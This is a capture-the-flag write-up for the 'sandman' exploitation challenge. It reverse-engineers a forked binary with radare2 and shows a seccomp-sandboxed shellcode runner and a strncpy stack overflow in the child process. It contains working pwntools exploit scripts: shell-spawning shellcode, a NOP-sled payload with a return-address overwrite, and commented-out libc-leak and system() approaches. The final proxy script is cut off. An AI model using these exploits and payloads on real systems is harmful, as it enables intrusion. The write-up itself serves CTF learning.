* **Category:** exploitation
* **Points:** 200

## Write-up

So we are given a x86_64 ELF binary and a network port it was running on.
First thing is I always check the enabled exploit mitigation techniques, so
that I know what I'm dealing with. Turns out everything is disabled. We don't
know about ASLR, so we must assume it's turned on (it wasn't).

```
$ checksec sandman
[*] '/ctf/hackim2016/exploitation/2_sandman/sandman'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE
```

Connecting to the service doesn't give much output.  So let's try to find out
what it is doing. Naturally I throw it into [radare2](http://radare.org) and
have look.  Unfortunately there is no output from the binary, so you can't
really tell what it's doing. I used `ltrace` and `strace` to confirm that I can
trigger the right execution paths with my input.

Fire up `r2 -A ./sandman` and `s main`. I then used `Vp` to get into visual
mode. Basically the first thing the binary does is

```
│       └─> 0x00400ebc      e8bffbffff     call sym.imp.fork
│           0x00400ec1      85c0           test eax, eax
│       ┌─< 0x00400ec3      7532           jne 0x400ef7
```

Remember: `fork` returns the pid of the child process in the parent process and
zero in the child process. So the parent will continue at `0x400ef7`. We can
just press enter to follow that jump in visual mode. We'll look at the child
process later.

### Parent Process

The first thing the parent does is setting up a couple of signal handlers.
Basically it's the same handler for all the signals.

```
│           0x00400f06      be7d0b4000     mov esi, 0x00400b7d       ; "UH..H....}........" @ 0x400b7d
│           0x00400f0b      bf0b000000     mov edi, 0xb
│           0x00400f10      e81bfbffff     call sym.imp.signal         ;[1]
```

Let's have a look at this signal handler. We can use `s 0x00400b7d` to jump to
the signal handlers code. In visual mode you can use `:` to enter normal radare
commands. radare's analysis hasn't detected this piece of code as a separate
function so we'll use `df` in visual mode to make a function. Because it's the
signal handlers we'll use `dr` in visual mode to rename the function. The
signal handler itself is rather boring.

```
 (fcn) fcn.signalhandler 26
│           ; var int local_0_1    @ rbp-0x1
│           ; DATA XREF from 0x00400f06 (fcn.signalhandler)
│           ; DATA XREF from 0x00400f15 (fcn.signalhandler)
│           ; DATA XREF from 0x00400f24 (fcn.signalhandler)
│           ; DATA XREF from 0x00400eca (fcn.signalhandler)
│           0x00400b7d      55             push rbp
│           0x00400b7e      4889e5         mov rbp, rsp
│           0x00400b81      4883ec10       sub rsp, 0x10
│           0x00400b85      897dfc         mov dword [rbp - 4], edi
│           0x00400b88      e803feffff     call sym.imp.getpid         ;[1]
│           0x00400b8d      bf01000000     mov edi, 1
╘           0x00400b92      e8d9feffff     call sym.imp.exit           ;[2]
```

Note that the child sets up the same handler for `SIGALRM`. The call to
`getpid` seems rather useless here. Maybe we can use it later during
exploitation, by overwriting the getpid GOT entry. (Spoiler: we won't) So the
parents sets up this signal handler for `0xb, 5, 0xe`. We can find out what
signals those are with a simple `cat /usr/include/asm/signal.h | grep $num`.
Turns out the signals are `SIGSEV, SIGTRAP, SIGALRM` repsectively.  (Hint: you
can quickly convert between hex/dec in radare using `?vd 0x1234` or `?v 1234`.)

So let's move on. Next the main function performs a read. Remember we're on
x86_64 so parameters are passed in the register `RDI, RSI, RDX, RCX, R8, R9,
XMM0 - 7`. I like to annotate calls to library functions with their C
declarations and in which register the parameters are. You can add comments in
visual mode by pressing `;`.

```
│           0x00400f3d      c745dc000000.  mov dword [rbp-local_4_4], 0
│           0x00400f44      488d45dc       lea rax, qword [rbp-local_4_4]
│           0x00400f48      ba04000000     mov edx, 4
│           0x00400f4d      4889c6         mov rsi, rax
│           0x00400f50      bf00000000     mov edi, 0
│           0x00400f55      e8a6faffff     call sym.imp.read           ; ssize_t read(int fd /*rdi*/, void *buf /*rsi*/, size_t count /*rdx*/);
```

So this is translates to a `read(0, &length, 4);`. Probably this is a integer
we'll see that it's used as a length.  Next instructions test whether this is 0
and the follows a call to mmap, which maps exactly as much bytes as given by
the user.

```
│      │    0x00400f7f      4889c6         mov rsi, rax                ; size_t length, user input
│      │    0x00400f82      bf00000000     mov edi, 0                  ; void* addr
│      │    0x00400f87      e834faffff     call sym.imp.mmap
│      │    0x00400f8c      488945f0       mov qword [rbp-local_2], rax
```

What follows is another call to read, which reads exactly as much data into the
newly mmaped buffer as in length.

So let's see what happens next. We can see that there are some calls to
[seccomp](https://en.wikipedia.org/wiki/Seccomp) functions. We'll skip these
for now and see what happens after those. Here is a very interesting piece of
code. This loads the address of the `mmap`ed area into `rdx` and jumps to it.

```
│ ││││││└─> 0x004010eb      488b45f0       mov rax, qword [rbp-local_2]
│ ││││││    0x004010ef      488945e0       mov qword [rbp-local_4], rax
│ ││││││    0x004010f3      488b55e0       mov rdx, qword [rbp-local_4]
│ ││││││    0x004010f7      b800000000     mov eax, 0
│ ││││││    0x004010fc      ffd2           call rdx
```

So what the parent process does is someting like this in pseudo-C:

```C
int32_t length;
char* addr;
read(stdin, &length, 4);
addr = mmap(NULL, length, ...);
read(stdin, addr, length);
// initialize seccomp sandbox
[...]
// call shellcode
addr();
```

So we can send the parent process our shellcode and it will happily execute it.
Unfortunately we are sandboxed with seccomp, so we probably won't be able to do
anyting useful. Note that the seccomp sandbox is set up after the call to
`fork` so the child process is not sandboxed. I assume the idea is to use the
parent process as a proxy for exploiting the child process.

Before reversing the seccomp calls I wrote a python script to interact with
the parent process. To verify that the shellcode execution works I patched out
the seccomp sandbox. This can be easily done using radare.

```
cp sandman sandman_noseccomp
r2 -w -A ./sandman_noseccomp
```

Note the `-w` flag to open in read/write mode. You can also use `oo+` to change
the mode in the radare shell. I navigated to the following point in visual
mode.

```
│     ││└─> 0x00401008      bf00000000     mov edi, 0
│     ││    0x0040100d      e83ef9ffff     call sym.imp.seccomp_init
```

Using the visual assembler (press `A`) you can easily patch binaries. I just
inserted a `jmp` instruction to the piece of code that executes our shellcode.

```
│    ┌──└─> 0x00401008      e9de000000     jmp 0x4010eb
│    │││    0x0040100d      e83ef9ffff     call sym.imp.seccomp_init
```

I used the [pwntools](https://github.com/Gallopsled/pwntools) fork
[binjitsu](https://binjitsu.readthedocs.org/), which has a couple of nice
improvements, such as ROP on `x86_64`, to interact with the binary. And indeed
it does give us a nice shell.

```python
from pwn import *  # NOQA

context.os = 'linux'
context.arch = 'amd64'

vulnbin = "./sandman_noseccomp"
velf = ELF(vulnbin)

sc = asm(shellcraft.amd64.linux.sh())

vp = process(vulnbin)
#vp = remote(...)

vp.send(p32(len(sc)))
vp.send(sc)

vp.clean_and_log()
vp.interactive()
```


### Seccomp Sandbox

So let's see what the seccomp sandbox allows us to do. There interesting parts
are the calls to `seccomp_rule_add`, which has the following signature:

```
int seccomp_rule_add(scmp_filter_ctx ctx,  // rdi
                     uint32_t action,      // rsi
                     int syscall,          // rdx
                     unsigned int arg_cnt, // rcx
                     ...);

#define SCMP_ACT_ALLOW    0x7fff0000U
```

In the binary there are four nearly identical calls to the this function, so we
are probably allowed to do 4 different syscalls. Let's look at one of those
calls.

```
│    │││└─> 0x00401022      488b45e8       mov rax, qword [rbp-local_3]
│    │││    0x00401026      b900000000     mov ecx, 0                  ; unsigned int arg_cnt
│    │││    0x0040102b      ba00000000     mov edx, 0                  ; int syscall
│    │││    0x00401030      be0000ff7f     mov esi, 0x7fff0000         ; uint32_t action
│    │││    0x00401035      4889c7         mov rdi, rax                ; scmp_filter_ctx ctx
│    │││    0x00401038      b800000000     mov eax, 0
│    │││    0x0040103d      e83ef9ffff     call sym.imp.seccomp_rule_add
```

This is repeated for the following syscalls:

 - 0 = read
 - 1 = write
 - 60 = exit
 - 231 = exit_group

Note that `arg_cnt` is set to 0 and no further arguments are given. This means
we can call the syscalls with any parameters we like.


### Child Process

So we have a pretty good idea of what we can do in the parent process. Now to
find out how to take over the child process. Before the fork the process sets
up a pipe so that parent and child process can communicate.

```
│           0x00400e8e      488d45d0       lea rax, qword [rbp-local_6]
│           0x00400e92      4889c7         mov rdi, rax
│           0x00400e95      e856fbffff     call sym.imp.pipe           ;[1]
```

The signature of pipe looks like this:

```
int pipe(int pipefd[2]);
```

`pipefd[0]` being the read end and `pipefd[1]` being the write end of the pipe.
As no other files are opened we can assume that the filedescriptor stored in
`pipefd` will be `{3, 4}`. We can confirm this using `strace`:

```
$ strace ./sandman
[...]
pipe([3, 4])                            = 0
[...]
```

The child process also sets up the alarm handler and then calls it's "main"
function. Passing the filedescriptor of the read end of the pipe as parameter.


```
│       │   0x00400ec5      e8c6faffff     call sym.imp.getpid
│       │   0x00400eca      be7d0b4000     mov esi, 0x400b7d
│       │   0x00400ecf      bf0e000000     mov edi, 0xe
│       │   0x00400ed4      e857fbffff     call sym.imp.signal
│       │   0x00400ed9      bf05000000     mov edi, 5
│       │   0x00400ede      e8fdfaffff     call sym.imp.alarm
│       │   0x00400ee3      8b45d0         mov eax, dword [rbp-local_6]
│       │   0x00400ee6      89c7           mov edi, eax
│       │   0x00400ee8      e83effffff     call fcn.child_main
│       │   0x00400eed      bf00000000     mov edi, 0
│       │   0x00400ef2      e879fbffff     call sym.imp.exit
```

We can quickly spot that this function reads one byte at a time from the pipe
and calls the following function, I called `handle_byte_read`. Note that eax is
here the read byte, passed as parameter. So the byte must be `0xe` so that we
get to the interesting function. This function can be very easily understood by
pressing `V` a second time in visual mode, so that we get the nice control flow
graph view.

```

```

The function `read_more_input` at `0x00400cca` basically reads a size from the
pipe, then allocates that much space (if it's below page size `0x1000`) and
fills this buffer by reading from the pipe. If everything went well it calls
another very suspicious function at `0x00400bac`, passing it the newly
allocated and filled buffer. I didn't bother reversing much because this
function has a very suspicious pattern of calling C string functions.

```
strncmp
strlen
atoi
strlen
strncpy
```

First keep in mind that the function allocates `0x230 == 560` bytes, and that
the parameter (the buffer) is stored at `local_69`.

```
│           0x00400bb0      4881ec300200.  sub rsp, 0x230
│           0x00400bb7      4889bdd8fdff.  mov qword [rbp-local_69], rdi
```

So let's take a closer look at the function calls:

```
│           0x00400bd3      ba07000000     mov edx, 7
│           0x00400bd8      be96114000     mov esi, str.http:__        ; "http://" @ 0x401196
│           0x00400bdd      4889c7         mov rdi, rax
```

So apparently our input must start with the string `http://`. And then at the
end of the function we have:

```
│  └──────> 0x00400c7b      488b85d8fdff.  mov rax, qword [rbp-local_69]
│       │   0x00400c82      4883c007       add rax, 7
│       │   0x00400c86      488945e8       mov qword [rbp-local_3], rax
│       │   0x00400c8a      488b45e8       mov rax, qword [rbp-local_3]
│       │   0x00400c8e      4889c7         mov rdi, rax
│       │   0x00400c91      e81afdffff     call sym.imp.strlen
```

Which calls `strlen` on the user provided data + 7, ignoring the `http://`
prefix. Then there is a call to `strncpy` which uses the string length of
the userinput and copies it onto the stack.

```
│       │   0x00400c96      4889c2         mov rdx, rax                ; size_t n == strlen(userinput+7)
│       │   0x00400c99      488b4de8       mov rcx, qword [rbp-local_3] ; char* src = userinput+7
│       │   0x00400c9d      488d85e0fdff.  lea rax, qword [rbp-local_68] ; char* dest = somewhere on the stack
│       │   0x00400ca4      4889ce         mov rsi, rcx
│       │   0x00400ca7      4889c7         mov rdi, rax
│       │   0x00400caa      e8b1fcffff     call sym.imp.strncpy
```

Classic stack based buffer overflow.

### Exploiting the Child Process

First of all I created a patched binary, that skips the forking and changes
`pipefd[0]` to `0`, so that I can directly communicate with the child process.
This is just a matter of writing a lot of `nop` instructions with radare. I
also remove the call to `alarm`, because that would be very annoying during
debugging. I then confirmed that I can trigger the vulnerability using `ltrace`.

```

calloc(42, 1)                                                                                         = 0x1cee010
read(0, "http://ABCDAAAAAAAAAAAAAAAAAAAAA"..., 41)                                                    = 41

strlen("http://ABCDAAAAAAAAAAAAAAAAAAAAA"...)                                                         = 41

exit(0 <no return ...>
+++ exited (status 0) +++
```

Now we can see that everything happened exactly as predicted. And the
destination for the strncpy is indeed on the stack. Now we need to develop a
reliable exploit for the child process.

So I used a combination of `binjitsu` and `gdb` with the
[peda plugin](https://github.com/longld/peda) to develop my exploit. First I
didn't go through the parent process, so that debugging is easier.

Now we cannot have `NULL` bytes in the buffer, or else `strncpy` won't copy
them onto the stack. This makes exploitation a little bit tricky. We
effectively cannot use ROP because most or probably all gadgets have `NULL`
bytes in their addresses. This also makes return to libc very hard, as we
cannot easily control the parameters, which are passed in the registers.


### Exploitation Attempts

Fortunately the child does not call `dup2` so stdin and stdout can be used in
the child process as usual. This means we can also interact with a shell
spawned in the child process, as long as the parent process doesn't try to read
from stdin. Output should never be a problem.

My first attempt was the following:

  1. Leak address of read from the parent process. Because `fork` doesn't
     change the address space layout, we can compute the base address of the
     libc for both the child and the parent process.
  2. Overwrite return address with the address of `system` executing the
     command that `rdi` points to.

This should work because when we return from the vulnerable function, `rdi`
contains a pointer to our buffer on the stack, directly after the `http://`
prefix. Because the first and only parameter to `system` is passed in `rdi` we
put our command directly after the `http://`. So that's what I did. In `gdb` we
can see that everything looks good.

```

Looks good so far. Unfortunately I didn't get any output, from the launched
shell command. In gdb I could see that bash was being executed but for some
reason there was no output.


My second attempt was to jump to the magic shell spawning gadget in the libc.
In all glibc there is a magic gadget which will call `execve` and use the
string `/bin/sh` as first parameter. This is part of the `system` code. So I
opened my libc in radare and search for this gadget.

So the new plan is:

  1. Leak libc base address.
  2. Compute address of magic shell spawning gadget.
  3. Overwrite return address.


Again in the debugger I can confirm that it works as expected. Again somehow
the environment prevents me from interacting with the spawned shell. This is
the only output I get from the child process.

```

00000037
```

At this point I gave up. This is not actually a good challenge anymore, it's
just annoying. Having everything in place but not being able to actually get
useful output was very frustrating. But it kept bothering me, I was so close.
So I decided to try solve it even though the CTF was already over.


I missed a very obvious thing during debugging. If we look at the stack print
of `peda` right before the return, we can see that directly after the return
address there is a pointer in the middle of our buffer on the stack.

```
[------------------------------------stack-------------------------------------]
0000| 0x7ffc467f1128 --> 0x7f7b40863890 (<system>:      test   rdi,rdi)
0008| 0x7ffc467f1130 --> 0x7ffc467f1084 --> ('A' <repeats 115 times>, "jhH...")
```

Remember there is no `NX` so we can jump to our buffer on the stack and execute
code. So the new plan is:

  1. Put shellcode inside buffer (must not contain `NULL` bytes)
  2. Overwrite return address to point to another `return` instruction
  3. Return again to our buffer, executing our shellcode
  4. Spawn shell

Fortunately this finally resulted in a working exploit :) This is the stack
right before the return:

```
[------------------------------------stack-------------------------------------]
0000| 0x7ffed1577438 --> 0x401174 (ret)
0008| 0x7ffed1577440 --> 0x7ffed1577394 --> 0x9090909090909090
```

Two returns later we are in the shellcode :) I used the shell spawning
shellcode `shellcraft.amd64.linux.sh` from `binjitsu`. For more details here is
the python script I wrote:

```python
from pwn import *  # NOQA

context.os = 'linux'
context.arch = 'amd64'

velf = ELF('./sandman')


def child_pwn(read_leak=None):

    # we can control this registers via the buffer
    rdx = 0x4142434445464748
    rbp = 0x4041424345464748
    rsi = 0x1111  # == rax == rcx
    # rdi = directly into our buffer, right after http://

    pl = ""
    pl += "B"
    pl += p64(rdx)
    pl += "KLMNOP"
    pl += p16(rsi)
    pl += p64(rbp)
    #cmd = "touch pwnd; id; ;pwd;ls -al;cat flag; #"
    #pl = "http://" + cmd + 'A' * (560 - 8 - len(pl) - len(cmd)) + pl

    #libc = ELF("/usr/lib64/libc-2.22.so")
    #offset_read = libc.symbols['read']
    #offset_system = libc.symbols['system']
    #libc_base = read_leak - offset_read
    #log.info("libc base is: " + hex(libc_base))

    #system = libc_base + offset_system
    #log.info("Computed system addr at: " + hex(system))

    #magic_gadget_offset = 0x0003f76a  # on arch
    #magic = libc_base + magic_gadget_offset
    #log.info("Computed magic /bin/sh gadget at: " + hex(magic))

    # ok apparently all the this was for nothing, as there is another pointer
    # to our buffer on the stack directly after our return address, so we can
    # just return again and jump to our shellcode...
    retgadget = 0x00401174

    sc = shellcraft.amd64.linux.sh()
    pl = asm(sc) + pl
    nop = asm(shellcraft.amd64.nop())
    pl = "http://" + nop * (560 - 8 - len(pl)) + pl

    # return addr overwrite
    #pl += p64(system)
    #pl += p64(magic)
    pl += p64(retgadget)
    log.info("using payload:\n" + hexdump(pl))

    if "\x00" in pl[:-2]:
        log.warn("NULL bytes in payload!")

    pl = pl.rstrip("\x00")
    pl = chr(0xe) + p32(len(pl)) + pl
    return pl

    context.log_level = 'debug'

    vulnbin = "./sandman_child"
    velf = ELF(vulnbin)
    #vp = process(["ltrace", vulnbin])

    vp = process(vulnbin)

    gdb.attach(vp)

    read = int(raw_input("read addr (hex): "), 16)

    vp.send(child_pwn(read))

    vp.sendline("\nls -al; pwd; id")
    vp.clean_and_log()
    vp.interactive()

```


### The Parent Process Exploit Proxy

Of course we need to proxy our input through the parent process. The parent
process can read and write to stdin, stdout and the child process via the
pipe. So I used a shellcode for the parent process that does the following:

  1. Read a size from stdin. If the size is 0, then loop infinitely.
  2. Allocate size bytes on the stack.
  3. Read size bytes onto the stack.
  4. Write size bytes to the pipefd 4
  5. goto 1

For more details see the python script:

```python
from pwn import *  # NOQA

context.os = 'linux'
context.arch = 'amd64'

vulnbin = "./sandman"
velf = ELF(vulnbin)

# warning this won't work because of seccomp filters!
